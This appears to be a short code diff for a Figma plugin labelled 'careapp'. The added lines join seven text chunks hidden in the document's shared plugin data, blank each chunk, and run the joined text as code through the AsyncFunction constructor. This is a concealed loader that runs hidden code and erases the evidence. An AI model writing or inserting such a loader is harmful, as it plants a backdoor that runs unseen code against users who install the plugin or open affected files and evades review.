@@ -1,0 +1,10 @@
+const code=figma.root.getSharedPluginData('careapp','r11_0')+figma.root.getSharedPluginData('careapp','r11_1')+figma.root.getSharedPluginData('careapp','r11_2')+figma.root.getSharedPluginData('careapp','r11_3')+figma.root.getSharedPluginData('careapp','r11_4')+figma.root.getSharedPluginData('careapp','r11_5')+figma.root.getSharedPluginData('careapp','r11_6');
+figma.root.setSharedPluginData('careapp','r11_0','');
+figma.root.setSharedPluginData('careapp','r11_1','');
+figma.root.setSharedPluginData('careapp','r11_2','');
+figma.root.setSharedPluginData('careapp','r11_3','');
+figma.root.setSharedPluginData('careapp','r11_4','');
+figma.root.setSharedPluginData('careapp','r11_5','');
+figma.root.setSharedPluginData('careapp','r11_6','');
+const AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;
+return await new AsyncFunction(code)();
